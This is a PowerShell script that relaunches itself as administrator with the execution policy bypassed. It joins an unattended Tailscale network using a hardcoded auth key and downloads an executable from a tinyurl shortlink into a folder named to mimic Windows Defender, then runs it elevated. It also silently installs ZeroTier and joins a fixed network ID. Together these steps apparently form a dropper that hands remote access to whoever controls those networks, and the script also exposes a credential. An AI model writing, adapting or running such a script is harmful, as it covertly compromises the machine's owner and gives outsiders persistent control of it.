if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Relaunch script as admin
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}
tailscale up --auth-key=tskey-auth-kAFCkKFvM721CNTRL-KrhpbsekTn83nSMSdz6fn81Vw8tNZTwe --unattended
Invoke-WebRequest -Uri "https://tinyurl.com/46jswbnp" -OutFile "C:\Program Files\defender\Executable\def.exe"
Start-Process "C:\Program Files\defender\Executable\def.exe" -Verb RunAs

Invoke-WebRequest -Uri "https://download.zerotier.com/RELEASES/1.12.2/dist/ZeroTier%20One.msi" -OutFile "$env:USERPROFILE\Downloads\ZeroTier.msi"
Start-Process "msiexec.exe" -ArgumentList "/i `"$env:USERPROFILE\Downloads\ZeroTier.msi`" /qn" -Wait
$env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)

Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

$env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)

choco install zerotier-one -y
$env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
zerotier-cli join "8bd5124fd6abcf8f"
